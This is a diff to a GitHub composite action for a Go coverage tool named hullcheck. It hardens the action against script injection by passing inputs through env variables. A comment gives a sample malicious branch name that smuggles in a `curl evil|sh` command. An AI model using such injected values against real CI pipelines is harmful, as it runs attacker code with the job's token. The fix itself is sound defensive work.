@@ -61,28 +61,38 @@ outputs:
 # Composite, not a container action. A container action would need Docker on the
 # runner and a published image; this needs only the Go toolchain, which means it
 # works from the first commit with nothing published anywhere.
+#
+# No `${{ }}` expression is ever written into a `run:` script. Inputs reach bash
+# through env: only, so they arrive as data. Interpolated, an input such as
+# `diff-base: ${{ github.head_ref }}` ran a branch name like `x";curl evil|sh;"`
+# as shell, with the job's token in reach.
 runs:
   using: composite
   steps:
     - uses: actions/setup-go@v5
       with:
-        go-version: "1.24"
+        go-version: "1.26"
         cache: false
 
     - id: build
       shell: bash
+      env:
+        ACTION_PATH: ${{ github.action_path }}
       run: |
         set -euo pipefail
-        go build -C "${{ github.action_path }}" -o "${RUNNER_TEMP}/hullcheck" ./cmd/hullcheck
+        go build -C "$ACTION_PATH" -o "${RUNNER_TEMP}/hullcheck" ./cmd/hullcheck
         echo "bin=${RUNNER_TEMP}/hullcheck" >> "$GITHUB_OUTPUT"
 
     # Read the numbers first, without any threshold, so the outputs are populated
     # even when the gating step below fails the job.
     - id: read
       shell: bash
+      env:
+        BIN: ${{ steps.build.outputs.bin }}
+        HC_PATH: ${{ inputs.path }}
       run: |
         set -uo pipefail
-        json="$("${{ steps.build.outputs.bin }}" --no-banner --json "${{ inputs.path }}" || true)"
+        json="$("$BIN" --no-banner --json -- "$HC_PATH" || true)"
         get() { printf '%s' "$json" | tr -d ' \n' | grep -o "\"$1\":[0-9.]*" | head -1 | cut -d: -f2; }
         echo "coverage=$(get gate_coverage || echo 0)" >> "$GITHUB_OUTPUT"
         echo "weighted=$(get weighted_gate_coverage || echo 0)" >> "$GITHUB_OUTPUT"
@@ -91,27 +101,37 @@ runs:
     - id: summary
       if: inputs.summary == 'true'
       shell: bash
+      env:
+        BIN: ${{ steps.build.outputs.bin }}
+        HC_PATH: ${{ inputs.path }}
       run: |
         set -uo pipefail
-        "${{ steps.build.outputs.bin }}" --no-banner --markdown "${{ inputs.path }}" \
-          >> "$GITHUB_STEP_SUMMARY" || true
+        "$BIN" --no-banner --markdown -- "$HC_PATH" >> "$GITHUB_STEP_SUMMARY" || true
 
     - id: run
       shell: bash
+      env:
+        BIN: ${{ steps.build.outputs.bin }}
+        HC_PATH: ${{ inputs.path }}
+        HC_DIFF_BASE: ${{ inputs.diff-base }}
+        HC_FORMAT: ${{ inputs.format }}
+        HC_SINCE: ${{ inputs.since }}
+        HC_VERIFY: ${{ inputs.verify }}
+        HC_WEIGHTED: ${{ inputs.weighted }}
+        HC_FAIL_UNDER: ${{ inputs.fail-under }}
       run: |
         set -euo pipefail
-        BIN="${{ steps.build.outputs.bin }}"
 
-        if [ -n "${{ inputs.diff-base }}" ]; then
-          exec "$BIN" diff --base "${{ inputs.diff-base }}" "${{ inputs.path }}"
+        if [ -n "$HC_DIFF_BASE" ]; then
+          exec "$BIN" diff --base "$HC_DIFF_BASE" -- "$HC_PATH"
         fi
 
         args=(--no-banner)
-        [ "${{ inputs.format }}" = "json" ] && args+=(--json)
-        [ "${{ inputs.format }}" = "markdown" ] && args+=(--markdown)
-        [ -n "${{ inputs.since }}" ] && args+=(--since "${{ inputs.since }}")
-        [ "${{ inputs.verify }}" = "true" ] && args+=(--verify)
-        [ "${{ inputs.weighted }}" = "true" ] && args+=(--weighted)
-        [ -n "${{ inputs.fail-under }}" ] && args+=(--fail-under "${{ inputs.fail-under }}")
+        [ "$HC_FORMAT" = "json" ] && args+=(--json)
+        [ "$HC_FORMAT" = "markdown" ] && args+=(--markdown)
+        [ -n "$HC_SINCE" ] && args+=(--since "$HC_SINCE")
+        [ "$HC_VERIFY" = "true" ] && args+=(--verify)
+        [ "$HC_WEIGHTED" = "true" ] && args+=(--weighted)
+        [ -n "$HC_FAIL_UNDER" ] && args+=(--fail-under "$HC_FAIL_UNDER")
 
-        exec "$BIN" "${args[@]}" "${{ inputs.path }}"
+        exec "$BIN" "${args[@]}" -- "$HC_PATH"
